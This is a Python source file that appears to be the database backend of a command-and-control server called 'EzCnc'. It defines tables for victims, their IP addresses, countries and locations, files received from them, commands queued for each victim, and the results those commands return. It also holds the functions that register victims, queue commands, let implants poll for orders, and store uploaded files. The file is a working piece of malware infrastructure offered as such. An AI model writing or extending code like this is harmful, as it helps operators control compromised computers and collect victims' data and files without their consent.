import sqlite3
from typing import Union
from fastapi import UploadFile
from Structs.Structs import Client, Command, CommandRequester, ClientResponse
from loguru import logger
from Exceptions import EzCncError
import os


class DB:
    def __init__(self, name: str) -> None:
        self.db = sqlite3.connect(f"{name}.db", check_same_thread=False)
        self.cr = self.db.cursor()
        self.INITIALIZE()

    def close(self):
        self.db.close()

    def uuid_to_name(self, uuid: Union[str, Client]) -> str:
        try:
            try:
                uuid = uuid.uuid
            except:
                pass
            Query = "SELECT name FROM victims_data where data_id = (select id from victims where uuid = ?)"
            name = self.cr.execute(Query, (uuid,)).fetchone()[0]
            return name

        except TypeError:
            raise EzCncError(f"Invalid victim uuid => unavailable in the database")

        except Exception as e:
            raise EzCncError(f"Error occured while querying name {e}")

    def name_to_uuid(self, name: Union[str, Client]) -> str:
        try:
            try:
                name = name.name
            except:
                pass
            Query = "SELECT uuid FROM victims where id = (select data_id from victims_data where name = ?)"
            name = self.cr.execute(Query, (name,)).fetchone()[0]
            return name

        except TypeError:
            raise EzCncError(f"Invalid victim name => unavailable in the database")

        except Exception as e:
            raise EzCncError(f"Error occured while querying name {e}")

    def INITIALIZE(self):
        victims_table = """
        CREATE TABLE IF NOT EXISTS victims(
            id INTEGER PRIMARY KEY NOT NULL, 
            uuid TEXT NOT NULL
        );
        """

        victims_data_table = """
        CREATE TABLE IF NOT EXISTS
            victims_data (
                data_id INTEGER,
                name TEXT,
                ip TEXT,
                country TEXT,
                location TEXT,
                FOREIGN KEY (data_id) REFERENCES victims(id)
        );
        """
        files_table = """
        CREATE TABLE IF NOT EXISTS 
            files(
                files_id INT PRIMARY KEY,
                file_name TEXT NOT NULL,
                file blob NOT NULL,
                file_type TEXT NOT NULL,
                recived_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(files_id) REFERENCES victims(id)
        );
        """
        commands_table = """

        CREATE TABLE IF NOT EXISTS
        commands(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            request_time DATETIME DEFAULT CURRENT_TIMESTAMP,
            command TEXT NOT NULL,
            target TEXT NOT NULL,
            parameter TEXT
        );
        """

        response_table = """

        CREATE TABLE IF NOT EXISTS
        response(
            id INTEGER,
            response_time DATETIME DEFAULT CURRENT_TIMESTAMP,
            command TEXT NOT NULL,
            response,
            result INTEGER,
            FOREIGN KEY(id) REFERENCES victims(id)
        );
        """

        self.cr.execute(victims_table)
        self.cr.execute(victims_data_table)
        self.cr.execute(files_table)
        self.cr.execute(commands_table)
        self.cr.execute(response_table)

    def uuid_to_id(self, uuid: str):
        resp = self.cr.execute("SELECT id FROM victims WHERE uuid = ?", (uuid,))
        result = resp.fetchone()
        if result:
            return result[0]
        else:
            return None

    def new_client(self, client: Client) -> bool:
        try:
            Query1 = "INSERT INTO victims(uuid) VALUES(?)"
            Query2 = "SELECT id FROM victims WHERE uuid = ?"
            Query3 = "INSERT INTO victims_data(data_id,name,ip,country,location) VALUES(?,?,?,?,?)"
            self.cr.execute(Query1, (client.uuid,))
            ID = self.cr.execute(Query2, (client.uuid,)).fetchone()[0]
            print(ID)
            self.cr.execute(
                Query3, (ID, client.name, client.ip, client.country, client.location)
            )
            self.db.commit()
            return True
        except Exception as e:
            raise EzCncError(f"Exception occured while adding a new victim [ {e} ]")

    def new_command(self, command: Command) -> bool:
        try:
            Query = "INSERT INTO commands(command,target,parameter) VALUES(?,?,?)"
            self.cr.execute(
                Query,
                (
                    command.command,
                    self.name_to_uuid(str(command.target)),
                    command.parameter,
                ),
            )
            self.db.commit()
            return True
        except TypeError:
            raise EzCncError(f"Invalid victim name => unavailable in the database")

        except Exception as e:
            raise EzCncError(f"Exception occured while adding a new command [ {e} ]")

    def iscommanded(self, Requester: CommandRequester) -> Union[Command, bool]:
        try:
            Query = "SELECT * FROM commands WHERE target= ?"
            res = self.cr.execute(Query, (Requester.uuid,)).fetchone()
            if res:
                return Command(command=res[2], target=res[3], parameter=res[4])
            else:
                return False
        except Exception as e:
            raise EzCncError(f"Exception occured while checking for commands [ {e} ]")

    def insert_file(self, file_data, uuid: str):
        query = "INSERT INTO files (files_id, file_name,file, file_type) VALUES (? , ? , ? , ?)"
        self.cr.execute(
            query,
            (
                self.uuid_to_id(str(uuid)),
                file_data.filename,
                file_data.file.read(),
                os.path.splitext(file_data.filename)[1],
            ),
        )
        self.db.commit()

    def insert_response(self, resp: ClientResponse):
        Query1 = "INSERT INTO response(id,command,response,result) VALUES(?,?,?,?)"
        Query2 = "INSERT INTO response(id,command,result) VALUES(?,?,?)"
        try:
            if resp.response == "":
                self.cr.execute(
                    Query2,
                    (self.uuid_to_id(str(resp.uuid)), resp.command, int(resp.result)),
                )
            else:
                self.cr.execute(
                    Query1,
                    (
                        self.uuid_to_id(str(resp.uuid)),
                        resp.command,
                        resp.response,
                        int(resp.result),
                    ),
                )

            self.db.commit()
        except Exception as e:
            logger.error(str(e))
